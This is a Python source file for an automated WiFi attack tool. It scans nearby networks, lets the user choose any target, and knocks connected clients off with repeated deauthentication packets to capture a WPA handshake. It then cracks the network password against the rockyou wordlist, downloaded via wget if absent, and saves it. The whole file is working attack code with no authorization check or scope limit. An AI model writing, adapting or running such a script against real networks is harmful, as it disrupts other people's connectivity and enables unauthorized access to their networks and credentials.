#!/usr/bin/env python3

from rich.console import Console
import subprocess
import time
import os
import shutil
from datetime import datetime
from modules.utils import (
    get_interface,
    setup_monitor_mode,
    get_data_path,
    cleanup_temp_files
)
import json
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

class HandshakeCapture:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_channel = None
        self.target_essid = None
        self.capture_file = None
        self.data_path = self._setup_data_paths()
        self.rockyou_path = self._get_rockyou_path()

    def _setup_data_paths(self):
        """Setup required data directories"""
        paths = {
            'captures': get_data_path('handshakes', ''),
            'passwords': get_data_path('passwords', '')
        }
        
        for path in paths.values():
            os.makedirs(path, exist_ok=True)
        
        return paths

    def _get_rockyou_path(self):
        """Get path to rockyou.txt, download if not present"""
        rockyou_locations = [
            "/usr/share/wordlists/rockyou.txt",
            os.path.join(self.data_path['passwords'], 'rockyou.txt'),
            "/usr/share/wordlists/rockyou.txt.gz"
        ]

        for location in rockyou_locations:
            if os.path.exists(location):
                if location.endswith('.gz'):
                    extracted_path = os.path.join(self.data_path['passwords'], 'rockyou.txt')
                    if not os.path.exists(extracted_path):
                        self.console.print("[cyan]Extracting rockyou.txt.gz...[/cyan]")
                        subprocess.run(['gunzip', '-c', location], stdout=open(extracted_path, 'wb'))
                    return extracted_path
                return location

        # If not found, download it
        download_path = os.path.join(self.data_path['passwords'], 'rockyou.txt')
        self.console.print("[yellow]rockyou.txt not found. Downloading...[/yellow]")
        try:
            subprocess.run([
                'wget',
                'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
                '-O', download_path
            ], check=True)
            self.console.print("[green]Successfully downloaded rockyou.txt![/green]")
            return download_path
        except:
            self.console.print("[red]Failed to download rockyou.txt. Password cracking may not work.[/red]")
            return None

    def scan_networks(self):
        """Scan for available networks"""
        try:
            # Create temporary file for scan results
            temp_file = f"/tmp/scan_{int(time.time())}"
            
            # Start airodump-ng scan
            scan_cmd = [
                'airodump-ng',
                '--output-format', 'csv',
                '--write', temp_file,
                self.interface
            ]
            
            self.console.print("\n[yellow]Scanning for networks (10 seconds)...[/yellow]")
            
            scan_process = subprocess.Popen(
                scan_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Show progress while scanning
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TimeElapsedColumn(),
            ) as progress:
                task = progress.add_task("[cyan]Scanning...", total=10)
                for i in range(10):
                    progress.update(task, advance=1)
                    time.sleep(1)
            
            scan_process.terminate()
            time.sleep(1)  # Wait for files to be written
            
            networks = []
            try:
                with open(f"{temp_file}-01.csv", 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    
                    for line in lines[2:]:  # Skip headers
                        if line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 14:  # Valid network line
                                essid = parts[13].strip()
                                if essid and essid != "":  # Only add networks with valid ESSID
                                    networks.append({
                                        'bssid': parts[0].strip(),
                                        'channel': parts[3].strip(),
                                        'essid': essid,
                                        'power': parts[8].strip()
                                    })
            except:
                pass
            finally:
                # Cleanup
                cleanup_temp_files()
            
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error scanning networks: {str(e)}[/red]")
            return []

    def select_target(self, networks):
        """Let user select target network"""
        if not networks:
            self.console.print("[red]No networks found![/red]")
            return False
            
        self.console.print("\n[green]Available Networks:[/green]")
        for idx, network in enumerate(networks, 1):
            self.console.print(
                f"{idx}. {network['essid']} "
                f"(BSSID: {network['bssid']}, "
                f"Channel: {network['channel']}, "
                f"Signal: {network['power']})"
            )
        
        while True:
            try:
                choice = int(input("\nSelect target network (1-{}): ".format(len(networks))))
                if 1 <= choice <= len(networks):
                    network = networks[choice - 1]
                    self.target_bssid = network['bssid']
                    self.target_channel = network['channel']
                    self.target_essid = network['essid']
                    return True
            except ValueError:
                pass
            self.console.print("[red]Invalid choice![/red]")
        
        return False

    def capture_handshake(self):
        """Capture WPA handshake using targeted deauth"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.capture_file = os.path.join(
                self.data_path['captures'],
                f'handshake_{self.target_bssid.replace(":", "")}_{timestamp}'
            )
            
            # Start airodump-ng to capture handshake
            capture_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', self.capture_file,
                '--output-format', 'pcap',
                self.interface
            ]
            
            capture_process = subprocess.Popen(
                capture_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Wait for airodump-ng to initialize
            time.sleep(2)
            
            # Get connected clients
            clients = self.get_connected_clients()
            
            if clients:
                self.console.print(f"\n[green]Found {len(clients)} connected clients[/green]")
                
                # Send deauth to each client
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    TimeElapsedColumn(),
                ) as progress:
                    for client in clients:
                        task = progress.add_task(f"[cyan]Deauthenticating client: {client}", total=None)
                        
                        # Send deauth packets
                        for _ in range(5):
                            deauth_cmd = [
                                'aireplay-ng',
                                '--deauth', '1',
                                '-a', self.target_bssid,
                                '-c', client,
                                self.interface
                            ]
                            subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            time.sleep(0.1)
                            
                            # Check for handshake
                            if self.verify_handshake():
                                capture_process.terminate()
                                return True
                        
                        progress.update(task, completed=True)
                        time.sleep(0.5)  # Wait between clients
            else:
                self.console.print("\n[yellow]No clients found. Sending broadcast deauth...[/yellow]")
                
                # Send broadcast deauth with progress
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    TimeElapsedColumn(),
                ) as progress:
                    task = progress.add_task("[cyan]Sending broadcast deauth", total=None)
                    
                    for _ in range(10):
                        deauth_cmd = [
                            'aireplay-ng',
                            '--deauth', '1',
                            '-a', self.target_bssid,
                            self.interface
                        ]
                        subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.1)
                        
                        # Check for handshake
                        if self.verify_handshake():
                            capture_process.terminate()
                            progress.update(task, completed=True)
                            return True
                    
                    progress.update(task, completed=True)
            
            capture_process.terminate()
            return self.verify_handshake()
            
        except Exception as e:
            self.console.print(f"[red]Error capturing handshake: {str(e)}[/red]")
            return False

    def get_connected_clients(self):
        """Get list of connected clients"""
        try:
            clients = set()
            temp_file = f"/tmp/clients_{int(time.time())}"
            
            # Monitor for clients
            monitor_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', temp_file,
                '--output-format', 'csv',
                self.interface
            ]
            
            process = subprocess.Popen(
                monitor_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Show progress while monitoring
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                TimeElapsedColumn(),
            ) as progress:
                task = progress.add_task("[cyan]Monitoring for clients", total=5)
                for i in range(5):
                    progress.update(task, advance=1)
                    time.sleep(1)
            
            process.terminate()
            
            # Parse results
            try:
                with open(f"{temp_file}-01.csv", 'r') as f:
                    lines = f.readlines()
                    
                    client_section = False
                    for line in lines:
                        if 'Station MAC' in line:
                            client_section = True
                            continue
                        if client_section and line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 6 and parts[5].strip() == self.target_bssid:
                                clients.add(parts[0].strip())
            except:
                pass
            finally:
                cleanup_temp_files()
            
            return list(clients)
            
        except Exception as e:
            self.console.print(f"[red]Error getting clients: {str(e)}[/red]")
            return []

    def verify_handshake(self):
        """Verify if handshake was captured"""
        try:
            capfile = f"{self.capture_file}-01.cap"
            if not os.path.exists(capfile):
                return False
                
            # Check with aircrack-ng
            cmd = ['aircrack-ng', capfile]
            process = subprocess.run(cmd, capture_output=True, text=True)
            return "1 handshake" in process.stdout
            
        except Exception as e:
            self.console.print(f"[red]Error verifying handshake: {str(e)}[/red]")
            return False

    def crack_password(self, capture_file):
        """Crack the captured handshake using rockyou.txt"""
        try:
            if not os.path.exists(capture_file):
                self.console.print("[red]Error: Capture file not found![/red]")
                return False

            if not self.rockyou_path or not os.path.exists(self.rockyou_path):
                self.console.print("[red]Error: rockyou.txt not found![/red]")
                return False

            # Setup output file
            password_file = os.path.join(
                self.data_path['passwords'],
                f'password_{self.target_bssid.replace(":", "")}.txt'
            )

            # Start aircrack-ng process
            self.console.print("\n[cyan]Starting password cracking...[/cyan]")
            
            process = subprocess.Popen(
                [
                    'aircrack-ng',
                    '-w', self.rockyou_path,
                    '-l', password_file,
                    '-b', self.target_bssid,
                    capture_file
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

            start_time = time.time()
            keys_tested = 0
            found = False

            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                TimeElapsedColumn(),
            ) as progress:
                task = progress.add_task("[cyan]Testing passwords...", total=None)
                
                while True:
                    line = process.stdout.readline()
                    if not line and process.poll() is not None:
                        break

                    # Update progress information
                    if "Tested" in line or "keys tested" in line.lower():
                        try:
                            current = int(line.split('(')[1].split(' ')[0])
                            elapsed = time.time() - start_time
                            speed = current / elapsed if elapsed > 0 else 0
                            progress.update(
                                task,
                                description=f"[cyan]Testing passwords... {current:,} tested ({speed:.0f} keys/s)"
                            )
                        except:
                            pass

                    # Check for success
                    if "KEY FOUND!" in line:
                        found = True
                        with open(password_file, 'r') as f:
                            password = f.read().strip()
                            self.console.print(f"\n[green]Password found: {password}[/green]")
                            
                            # Save detailed results
                            results_file = os.path.join(
                                self.data_path['passwords'],
                                f'details_{self.target_bssid.replace(":", "")}.txt'
                            )
                            with open(results_file, 'w') as rf:
                                rf.write(f"Network: {self.target_essid}\n")
                                rf.write(f"BSSID: {self.target_bssid}\n")
                                rf.write(f"Channel: {self.target_channel}\n")
                                rf.write(f"Password: {password}\n")
                                rf.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                                rf.write(f"Time taken: {int(time.time() - start_time)} seconds\n")
                            return True

            if not found:
                self.console.print("\n[yellow]Password not found in wordlist.[/yellow]")
            return False

        except Exception as e:
            self.console.print(f"\n[red]Error during password cracking: {str(e)}[/red]")
            return False
        finally:
            try:
                if 'process' in locals():
                    process.terminate()
            except:
                pass

    def start_capture(self):
        """Main method to start handshake capture process"""
        try:
            # Get interface
            self.interface = get_interface()
            if not self.interface:
                return
            
            # Setup monitor mode
            self.interface = setup_monitor_mode(self.interface)
            if not self.interface:
                self.console.print("[red]Failed to enable monitor mode![/red]")
                return
            
            # Scan networks
            networks = self.scan_networks()
            if not self.select_target(networks):
                return
            
            self.console.print(f"\n[cyan]Starting capture for {self.target_essid}[/cyan]")
            
            if self.capture_handshake():
                self.console.print("\n[green]Handshake captured successfully![/green]")
                capture_file = f"{self.capture_file}-01.cap"
                self.console.print(f"[green]Capture saved to: {capture_file}[/green]")
                
                # Automatically start password cracking
                self.console.print("\n[cyan]Starting password cracking...[/cyan]")
                self.crack_password(capture_file)
            else:
                self.console.print("\n[red]Failed to capture handshake![/red]")
            
        except KeyboardInterrupt:
            self.console.print("\n[yellow]Capture stopped by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")
        finally:
            # Cleanup
            try:
                subprocess.run(['airmon-ng', 'stop', self.interface],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
                cleanup_temp_files()
            except:
                pass
            
            pass 